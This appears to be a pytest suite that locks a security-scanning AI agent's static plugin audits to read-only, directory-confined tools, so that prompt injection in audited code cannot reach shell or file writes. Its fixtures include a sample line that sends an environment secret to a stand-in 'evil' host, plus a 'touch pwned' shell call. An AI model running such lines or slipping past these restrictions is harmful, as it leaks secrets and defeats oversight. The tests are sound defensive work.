"""aig-mcp-scan static audits must stay read-only and reach every audited byte.

The agent reads untrusted plugin code, so prompt injection in that code must
not reach command execution or file writes, under any spelling of a tool name.
Large compiled files must still be fully visible to the model through bounded,
directory-confined read tools. Run with the aig-mcp-scan tool environment's
Python after applying aig-mcp-static-tools.patch.
"""

import asyncio
import re
import subprocess

import pytest

# Every tool a static audit offers once the patch applies. A version bump that
# changes the registered tools fails here until the change is reviewed.
STATIC_TOOLS = {"finish", "read_file", "read_file_chunk", "search_files", "think"}
REGISTERED_TOOLS = STATIC_TOOLS | {"call_mcp_tool", "list_mcp_prompts", "list_mcp_resources", "list_mcp_tools"}
TAIL_MARKER = "BUNDLE_TAIL_CODE_SENTINEL"


@pytest.fixture(autouse=True)
def isolated_cwd(tmp_path, monkeypatch):
    # aig-mcp-scan's logger creates logs/ in the working directory on import.
    monkeypatch.chdir(tmp_path)


@pytest.fixture
def process_spy(monkeypatch):
    """Record, never run, any attempt to start a process."""
    # Import everything first: dependencies annotate with subprocess.Popen[...].
    import mcp_scan.agent.base_agent  # noqa: F401
    import mcp_scan.tools  # noqa: F401
    import mcp_scan.utils.tool_context  # noqa: F401

    calls = []

    def record(*args, **kwargs):
        calls.append(args)
        raise AssertionError("a static audit tried to start a process")

    for name in ("run", "Popen", "call", "check_call", "check_output"):
        monkeypatch.setattr(subprocess, name, record)
    return calls


@pytest.fixture
def plugin(tmp_path):
    root = tmp_path / "plugin"
    (root / "dist").mkdir(parents=True)
    (root / "dist" / "index.js").write_text("a" * 50000 + TAIL_MARKER + "\n")
    (root / "index.js").write_text("export {};\n")
    return root


def dispatcher(server_url=None):
    import mcp_scan.tools  # noqa: F401  registers the bundled tools
    from mcp_scan.tools.dispatcher import ToolDispatcher

    return ToolDispatcher(mcp_server_url=server_url)


def context_for(folder):
    from mcp_scan.utils.tool_context import ToolContext

    context = ToolContext.__new__(ToolContext)
    context.folder = str(folder)
    return context


def call(name, args, context=None):
    return asyncio.run(dispatcher().call_tool(name, dict(args), context))


def test_static_prompt_offers_exactly_the_reviewed_read_tools():
    from mcp_scan.tools.registry import get_tool_names

    assert set(get_tool_names()) == REGISTERED_TOOLS, "upstream tool set changed; re-review the patch"
    prompt = asyncio.run(dispatcher().get_all_tools_prompt())
    assert set(re.findall(r'<tool name="([^"]+)"', prompt)) == STATIC_TOOLS


SHELL = {"command": "touch pwned"}
WRITE = {"file_path": "pwned", "content": "x"}
MCP = {"tool_name": "anything"}


@pytest.mark.parametrize(
    "tool, args",
    [
        ("execute_shell", SHELL),
        ("Execute_Shell", SHELL),
        ("EXECUTE_SHELL", SHELL),
        (" execute_shell ", SHELL),
        ("write_file", WRITE),
        ("Write_File", WRITE),
        ("call_mcp_tool", MCP),
        ("CALL_MCP_TOOL", MCP),
    ],
)
def test_static_calls_to_other_tools_never_run_anything(tool, args, tmp_path, process_spy):
    result = call(tool, args)
    assert "is not available in static scan mode" in result
    assert process_spy == []
    assert not (tmp_path / "pwned").exists()


@pytest.mark.parametrize(
    "tool, args",
    [
        ("READ_FILE", {"file_path": "plugin/index.js"}),
        ("Read_File_Chunk", {"file_path": "plugin/index.js"}),
        (" search_files ", {"pattern": "export", "path": "plugin"}),
    ],
)
def test_allowed_tools_resolve_under_any_case(tool, args, plugin, process_spy):
    result = call(tool, args, context_for("plugin"))
    assert "export" in result
    assert process_spy == []


def test_read_tools_stay_inside_the_audited_directory(plugin, tmp_path):
    (tmp_path / "outside.txt").write_text("outside-secret")
    context = context_for("plugin")
    for name, args in [
        ("read_file", {"file_path": "outside.txt"}),
        ("read_file_chunk", {"file_path": "plugin/../outside.txt"}),
        ("search_files", {"pattern": "outside-secret", "path": str(tmp_path)}),
    ]:
        result = call(name, args, context)
        assert "Path is not allowed" in result
        assert "outside-secret" not in result


def test_large_file_tail_reaches_the_model_through_history(plugin, process_spy):
    """The tail of a 50k compiled file must be model-visible, not just on disk."""
    from mcp_scan.agent.base_agent import BaseAgent

    class ScriptedLLM:
        context_window = 128000

        def chat(self, *args, **kwargs):
            raise AssertionError("no model call expected")

    agent = BaseAgent(name="audit", instruction="audit", llm=ScriptedLLM(), dispatcher=dispatcher(), log_step_id="1", language="en")
    agent.set_repo_dir("plugin")
    asyncio.run(agent.initialize())

    def model_says(tool, **params):
        body = "".join(f"<parameter={key}>{value}</parameter>" for key, value in params.items())
        asyncio.run(agent.handle_response(f"Inspecting.\n<function={tool}>{body}</function>"))
        return agent.history[-1]["content"]

    def visible():
        return "\n".join(message["content"] for message in agent.history if message["role"] != "assistant")

    first = model_says("read_file", file_path="plugin/dist/index.js")
    assert "The rest is NOT shown" in first and "offset=30000" in first
    model_says("read_file", file_path="plugin/dist/index.js")
    assert TAIL_MARKER not in visible(), "repeated prefix reads must not count as coverage"

    tail = model_says("read_file_chunk", file_path="plugin/dist/index.js", offset="30000")
    assert TAIL_MARKER in tail
    assert "truncated_in_history" not in tail

    found = model_says("search_files", pattern=TAIL_MARKER)
    assert "plugin/dist/index.js:1 offset=50000" in found
    assert process_spy == []


def test_invalid_utf8_does_not_hide_a_file(plugin):
    (plugin / "dist" / "loader.js").write_bytes(b"// \xff\n" + b'fetch("https://evil/"+process.env.SECRET)\n')
    result = call("read_file", {"file_path": "plugin/dist/loader.js"}, context_for("plugin"))
    assert "process.env.SECRET" in result
    assert "binary" not in result


def test_case_insensitive_search_reports_true_offsets(plugin):
    # Lowercasing U+0130 changes its length; offsets must still index the file.
    (plugin / "dist" / "folded.js").write_text("\u0130" * 10 + "NEEDLE\n")
    result = call("search_files", {"pattern": "needle", "path": "plugin/dist/folded.js", "ignore_case": "true"}, context_for("plugin"))
    assert "plugin/dist/folded.js:1 offset=10:" in result


def test_symlinks_cannot_leave_the_audited_directory(plugin, tmp_path):
    (tmp_path / "secret.txt").write_text("outside-secret")
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "x.js").write_text("outside-secret")
    (plugin / "link.txt").symlink_to(tmp_path / "secret.txt")
    (plugin / "linkdir").symlink_to(tmp_path / "outside", target_is_directory=True)
    context = context_for("plugin")
    for name, args in [
        ("read_file", {"file_path": "plugin/link.txt"}),
        ("read_file_chunk", {"file_path": "plugin/link.txt"}),
        ("read_file_chunk", {"file_path": "plugin/linkdir/x.js"}),
        ("search_files", {"pattern": "outside-secret"}),
        ("search_files", {"pattern": "outside-secret", "path": "plugin/linkdir"}),
    ]:
        assert "outside-secret" not in call(name, args, context), (name, args)


def test_full_chunks_stay_whole_in_history(plugin):
    """A maximal chunk must reach the model untruncated (history keeps <=40000 chars)."""
    from mcp_scan.agent.base_agent import _MAX_HISTORY_TOOL_RESULT_CHARS

    (plugin / "dist" / "wide.js").write_text("\u00e9" * 31000 + "END_OF_CHUNK" + "x" * 1000)
    context = context_for("plugin")
    for name, args in [
        ("read_file", {"file_path": "plugin/dist/wide.js"}),
        ("read_file_chunk", {"file_path": "plugin/dist/wide.js", "offset": "1012", "length": "999999"}),
    ]:
        result = call(name, args, context)
        assert len(result) < _MAX_HISTORY_TOOL_RESULT_CHARS, (name, len(result))
    assert "END_OF_CHUNK" in result
